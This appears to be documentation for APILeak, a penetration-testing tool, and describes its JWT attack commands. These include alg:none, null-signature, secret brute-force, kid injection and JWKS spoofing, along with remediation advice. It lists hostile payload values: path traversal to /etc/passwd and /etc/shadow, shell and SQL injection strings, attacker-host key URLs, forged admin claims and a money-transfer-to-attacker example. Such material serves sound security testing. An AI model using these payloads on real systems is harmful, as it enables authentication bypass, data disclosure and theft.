# JWT Attack Testing

APILeak provides comprehensive JWT (JSON Web Token) attack testing capabilities through dedicated commands that test various JWT vulnerabilities against live endpoints. This document covers all available JWT attack vectors and their usage.

## Overview

JWT attacks exploit vulnerabilities in JWT implementation, validation, and key management. APILeak's JWT attack testing includes:

- **Algorithm Confusion Attacks** - Bypass signature verification
- **Secret Brute-forcing** - Crack weak HMAC secrets
- **Key Injection Attacks** - Exploit key parameter handling
- **JWKS Manipulation** - Spoof or inject malicious key sets
- **Signature Bypass** - Test null/empty signature acceptance

## Quick Start

```bash
# Basic JWT decoding
python apileaks.py jwt decode TOKEN

# Algorithm confusion attack
python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/protected

# Comprehensive attack testing
python apileaks.py jwt attack-test TOKEN --url https://api.example.com/protected
```

## Available Commands

### 🔍 `jwt decode` - Token Analysis

Decode and analyze JWT tokens without verification.

```bash
# Basic decoding
python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

# Output includes:
# - Header analysis (algorithm, type)
# - Payload claims (sub, exp, iat, etc.)
# - Signature information
# - Security warnings
```

### 🔐 `jwt brute-secret` - HMAC Secret Brute-force

**Severity: CRITICAL** - Complete authentication compromise

Attempts to crack JWT HMAC secrets and demonstrates exploitation:

```bash
# Basic secret brute-force
python apileaks.py jwt brute-secret TOKEN

# With custom wordlist
python apileaks.py jwt brute-secret TOKEN --wordlist custom_secrets.txt

# Test exploitation against real endpoint
python apileaks.py jwt brute-secret TOKEN --url https://api.example.com/admin

# With custom headers and POST data
python apileaks.py jwt brute-secret TOKEN \
  --url https://api.example.com/protected \
  --header "X-API-Key: key123" \
  --data '{"action": "read"}' \
  --timeout 60
```

**Attack Process:**
1. ✅ Confirms JWT uses HS* algorithm
2. ✅ Executes brute-force/dictionary attack  
3. ✅ Recovers the real secret
4. ✅ Forges new JWT with modified claims (role, scope, sub, exp)
5. ✅ Tests real API access with forged token

**Expected Exploitation:**
- Change role, scope, sub claims
- Extend exp (expiration) 
- Access privileged endpoints
- Complete authentication bypass

### 🧪 `jwt test-alg-none` - Algorithm Confusion

**Severity: CRITICAL** - Authentication completely nullified

Tests algorithm confusion attacks by setting algorithm to "none":

```bash
# Basic alg:none test
python apileaks.py jwt test-alg-none TOKEN

# With custom admin payload
python apileaks.py jwt test-alg-none TOKEN \
  --payload '{"sub":"admin","role":"admin","admin":true}'

# Test against real endpoint
python apileaks.py jwt test-alg-none TOKEN \
  --url https://api.example.com/admin \
  --header "Authorization: Bearer backup-token"
```

**Attack Process:**
1. ✅ Rewrites header: "alg": "none"
2. ✅ Removes signature completely
3. ✅ Inserts malicious payload
4. ✅ Sends unsigned token
5. ✅ Tests privileged access

**Expected Exploitation:**
- Login without credentials
- Identity impersonation  
- Complete authentication bypass
- Access to any protected resource

### 🧾 `jwt test-null-signature` - Null Signature Bypass

**Severity: CRITICAL** - Cryptographic validation bypass

Tests various null signature bypass techniques:

```bash
# Basic null signature test
python apileaks.py jwt test-null-signature TOKEN

# With custom admin payload
python apileaks.py jwt test-null-signature TOKEN \
  --payload '{"sub":"admin","admin":true}'

# Test against real endpoint
python apileaks.py jwt test-null-signature TOKEN \
  --url https://api.example.com/protected \
  --timeout 30
```

**Attack Variants:**
- Empty signature: `header.payload.`
- No signature section: `header.payload`
- Literal null: `header.payload.null`
- Empty object: `header.payload.{}`
- Zero signature: `header.payload.0`

**Expected Exploitation:**
- Complete signature bypass
- Arbitrary token acceptance
- Authentication nullification

### 🗝️ `jwt test-kid-injection` - Key ID Injection

**Severity: HIGH → CRITICAL** (depends on backend)

Tests Key ID (kid) parameter injection vulnerabilities:

```bash
# Basic kid injection test
python apileaks.py jwt test-kid-injection TOKEN

# Custom kid payload
python apileaks.py jwt test-kid-injection TOKEN \
  --kid-payload "http://evil.com/key.pem"

# Custom JWT payload
python apileaks.py jwt test-kid-injection TOKEN \
  --payload '{"sub":"admin","role":"admin","admin":true}'

# Both custom payloads with endpoint testing
python apileaks.py jwt test-kid-injection TOKEN \
  --kid-payload "../../etc/passwd" \
  --payload '{"admin":true}' \
  --url https://api.example.com/protected
```

**Payload Options:**

#### `--kid-payload` (Kid Parameter Injection)
Controls the `kid` parameter in the JWT header:
- **Path Traversal**: `../../etc/passwd`, `../../../etc/shadow`
- **Remote URLs**: `http://attacker.com/key.pem`, `https://evil.com/key`
- **Command Injection**: `$(whoami)`, `key'; whoami; #`
- **SQL Injection**: `'; DROP TABLE users; --`

#### `--payload` (JWT Claims Injection)
Controls the JWT payload (claims):
- **Admin Escalation**: `{"sub":"admin","role":"admin","admin":true}`
- **User Impersonation**: `{"sub":"admin","user_id":1}`
- **Custom Claims**: `{"scope":"read write delete","privileges":["admin"]}`

**Attack Combinations:**
The command generates all combinations of kid payloads × JWT payloads, providing comprehensive coverage.

**Expected Exploitation:**
- File disclosure (path traversal)
- Validation with arbitrary keys
- Remote key fetching from attacker server
- Potential RCE in vulnerable parsers

### 🕸️ `jwt test-jwks-spoof` - JWKS Spoofing

**Severity: CRITICAL** - Trust boundary broken

Tests JWKS URL spoofing vulnerabilities:

```bash
# Basic JWKS spoofing test
python apileaks.py jwt test-jwks-spoof TOKEN

# Custom malicious JWKS URL
python apileaks.py jwt test-jwks-spoof TOKEN \
  --jwks-url http://evil.com/jwks.json

# Test against real endpoint
python apileaks.py jwt test-jwks-spoof TOKEN \
  --url https://api.example.com/protected \
  --header "X-Forwarded-For: 127.0.0.1"
```

**Attack Vectors:**
- **JKU Parameter**: Points to attacker-controlled JWKS
- **X5U Parameter**: Points to attacker-controlled X.509 certificates
- **URL Variations**: HTTP, HTTPS, localhost, internal networks
- **Protocol Abuse**: file://, ftp://, data: URLs

**Expected Exploitation:**
- Blind trust in external keys
- Valid token without legitimate IdP
- Server fetches from attacker-controlled URLs

### 🧬 `jwt test-inline-jwks` - Inline JWKS Injection

**Severity: CRITICAL** - Total cryptographic control

Tests inline JWKS injection vulnerabilities:

```bash
# Basic inline JWKS test
python apileaks.py jwt test-inline-jwks TOKEN

# Test against real endpoint
python apileaks.py jwt test-inline-jwks TOKEN \
  --url https://api.example.com/admin

# With custom headers
python apileaks.py jwt test-inline-jwks TOKEN \
  --url https://api.example.com/protected \
  --header "X-API-Key: key123"
```

**Key Types Tested:**
- **RSA Keys**: Standard RSA public keys
- **EC Keys**: Elliptic Curve keys
- **Symmetric Keys**: HMAC shared secrets
- **X5C Chains**: Certificate chains

**Expected Exploitation:**
- Complete control of validation process
- Arbitrary tokens accepted by server
- Server trusts attacker-provided keys

### 🚀 `jwt attack-test` - Comprehensive Testing

**Severity: CRITICAL** - All attack vectors

Executes all JWT attack vectors automatically:

```bash
# Comprehensive attack testing
python apileaks.py jwt attack-test TOKEN \
  --url https://api.example.com/protected

# With custom headers and POST data
python apileaks.py jwt attack-test TOKEN \
  --url https://api.example.com/api/v1/admin \
  --header "X-API-Key: secret123" \
  --header "User-Agent: Mobile-App/1.0" \
  --data '{"action": "read", "resource": "users"}' \
  --timeout 60 \
  --max-retries 5
```

**Includes All Attack Vectors:**
- Algorithm confusion (alg:none, null signature)
- Weak HMAC secret brute-force
- Key ID injection attacks
- JWKS spoofing and inline injection
- Privilege escalation and user impersonation

## Common Options

All JWT attack commands support these common options:

### Required Parameters
- `TOKEN` - JWT token to use as base for attacks

### Endpoint Testing
- `--url`, `-u` - Target URL to test attacks against
- `--header`, `-H` - Custom headers (can be used multiple times)
- `--data`, `-d` - POST data for request body
- `--timeout` - Request timeout in seconds (default: 30)

### Attack Customization
- `--payload` - Custom JWT payload (JSON format)
- `--kid-payload` - Custom kid parameter value (kid injection only)
- `--jwks-url` - Custom JWKS URL (JWKS spoofing only)

## Usage Examples

### Basic Attack Testing

```bash
# Test all attack vectors against an endpoint
python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... \
  --url https://api.example.com/protected

# Test specific attack with custom payload
python apileaks.py jwt test-alg-none eyJ0eXAiOiJKV1Q... \
  --payload '{"sub":"admin","role":"admin"}' \
  --url https://api.example.com/admin
```

### Advanced Attack Scenarios

```bash
# Multi-header authentication bypass
python apileaks.py jwt test-kid-injection TOKEN \
  --kid-payload "../../etc/passwd" \
  --payload '{"admin":true,"scope":"read write delete"}' \
  --url https://api.example.com/users \
  --header "Authorization: Bearer backup-token" \
  --header "X-API-Key: fallback-key" \
  --header "X-Forwarded-For: 127.0.0.1"

# POST endpoint exploitation
python apileaks.py jwt brute-secret TOKEN \
  --url https://api.example.com/transactions \
  --data '{"amount": 1000000, "recipient": "attacker"}' \
  --header "Content-Type: application/json"

# Development environment testing
python apileaks.py jwt test-jwks-spoof TOKEN \
  --jwks-url http://localhost:8080/malicious-jwks.json \
  --url https://dev-api.local/protected \
  --timeout 60
```

### CI/CD Integration

```bash
# Automated security testing
python apileaks.py jwt attack-test "${JWT_TOKEN}" \
  --url "${API_ENDPOINT}" \
  --header "X-API-Key: ${API_KEY}" \
  --timeout 30 \
  --max-retries 3
```

## Attack Results

### Success Indicators

JWT attacks are considered successful when:

- **2xx Status Codes**: Server accepts the malicious token
- **Privileged Content**: Response contains admin/dashboard content
- **No Error Messages**: Absence of unauthorized/forbidden errors
- **File Disclosure**: System files exposed (kid injection)
- **Command Execution**: Evidence of command execution
- **JWKS Processing**: Server processes attacker-controlled keys

### Vulnerability Severity

- **🚨 CRITICAL**: Complete authentication bypass, file disclosure, RCE
- **🟠 HIGH**: Privilege escalation, user impersonation
- **🟡 MEDIUM**: Information disclosure, timing attacks

### Exit Codes

- `0` - No vulnerabilities or low/medium severity only
- `1` - High severity vulnerabilities detected
- `2` - Critical vulnerabilities detected
- `130` - Interrupted by user (Ctrl+C)

## Output and Reporting

### Real-time Output

```
🔍 Algorithm Confusion Attack (alg:none)
=============================================
🔥 SEVERITY: CRITICAL - Authentication Completely Nullified

📋 Original Header: {"typ": "JWT", "alg": "HS256"}
📋 Original Payload: {"sub": "user123", "name": "John Doe"}

1️⃣ Rewriting header algorithm to 'none'...
3️⃣ Creating malicious payloads...
✅ Generated Admin Privilege Escalation token
✅ Generated User Impersonation token

🧪 Admin Privilege Escalation Test:
   Status: 200
   Length: 1247 bytes
   🚨 CRITICAL VULNERABILITY CONFIRMED!
   💀 Evidence: 2xx Success Status, Privileged Content Detected
   💀 Server accepted unsigned token!
```

### File Storage

When using `jwt attack-test`, results are saved to:

```
jwtattack/[session-id]/
├── tokens/                    # Generated attack tokens (*.jwt)
├── responses/                 # HTTP response details (*.json)
├── reports/                   # Human-readable and JSON reports
└── baseline_response.json     # Original token response
```

## Security Considerations

### Ethical Usage

- **Only test systems you own** or have explicit permission to test
- **Be mindful of rate limits** - attacks generate multiple requests
- **Monitor for security alerts** - some attacks may trigger monitoring
- **Verify results manually** before reporting vulnerabilities

### Remediation Guidance

#### Algorithm Confusion Prevention
- Configure JWT library to **REJECT alg:none tokens**
- Implement **algorithm whitelist** (e.g., only allow HS256, RS256)
- **Never trust** the algorithm specified in JWT header
- Use **proper JWT validation libraries**, not custom implementations

#### Secret Security
- Use **strong, randomly generated** HMAC secrets (32+ characters)
- Consider switching to **RS256 (asymmetric)** algorithm
- Implement **proper secret rotation** policies
- **Never use default** or common secrets

#### Key Management
- **Validate and sanitize** kid parameter before use
- Use **allowlist of permitted** key identifiers
- **Never use kid parameter** directly in file paths or URLs
- Implement **proper input validation** and path traversal protection
- **Avoid dynamic key loading** based on user input

#### JWKS Security
- Implement **JWKS URL allowlist** - only trust known, legitimate URLs
- **Validate JWKS URLs** against strict patterns
- Use **certificate pinning** for JWKS endpoints
- **Never trust user-controlled** jku or x5u parameters
- Consider using **static key stores** instead of dynamic JWKS

## Integration with APILeak

JWT attack testing integrates seamlessly with APILeak's other features:

### With OWASP Testing

```bash
# Combine JWT attacks with OWASP testing
python apileaks.py full \
  --target https://api.example.com \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --modules bola,auth,property
```

### With Fuzzing

```bash
# JWT-authenticated parameter fuzzing
python apileaks.py par \
  --target https://api.example.com/protected \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --wordlist wordlists/parameters.txt
```

### With Discovery

```bash
# JWT-authenticated endpoint discovery
python apileaks.py dir \
  --target https://api.example.com \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --wordlist wordlists/admin_endpoints.txt
```

## Troubleshooting

### Common Issues

#### Invalid JWT Token Format
```bash
❌ Error decoding JWT: Invalid JWT format - must have 3 parts separated by dots
```
**Solution**: Ensure token has format `header.payload.signature`

#### Network Timeouts
```bash
❌ Request failed: timeout
```
**Solution**: Increase timeout with `--timeout 60`

#### SSL Certificate Errors
```bash
❌ Request failed: SSL verification failed
```
**Solution**: Use `--no-ssl-verify` for testing environments only

### Debug Mode

For detailed debugging, check the logs or use verbose output options available in the main APILeak commands.

## Advanced Topics

### Custom Wordlists

Create custom wordlists for secret brute-forcing:

```bash
# Create custom JWT secrets wordlist
cat > custom_jwt_secrets.txt << EOF
secret
password
jwt_secret
your_app_secret
development_key
staging_secret
EOF

python apileaks.py jwt brute-secret TOKEN \
  --wordlist custom_jwt_secrets.txt
```

### Automation Scripts

```bash
#!/bin/bash
# JWT security testing script

TOKEN="$1"
TARGET="$2"

echo "🔍 Starting JWT Security Assessment"

# Test all attack vectors
python apileaks.py jwt attack-test "$TOKEN" --url "$TARGET"

# Individual attack testing
python apileaks.py jwt brute-secret "$TOKEN" --url "$TARGET"
python apileaks.py jwt test-alg-none "$TOKEN" --url "$TARGET"
python apileaks.py jwt test-kid-injection "$TOKEN" --url "$TARGET"

echo "✅ JWT Security Assessment Complete"
```

## References

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 - JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [RFC 7517 - JSON Web Key (JWK)](https://tools.ietf.org/html/rfc7517)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Attack Handbook](https://github.com/ticarpi/jwt_tool/wiki)

---

For more information about APILeak's other security testing capabilities, see:
- [OWASP Testing Guide](owasp-modules-guide.md)
- [User Guide](user-guide.md)
- [Usage Examples](usage-examples.md)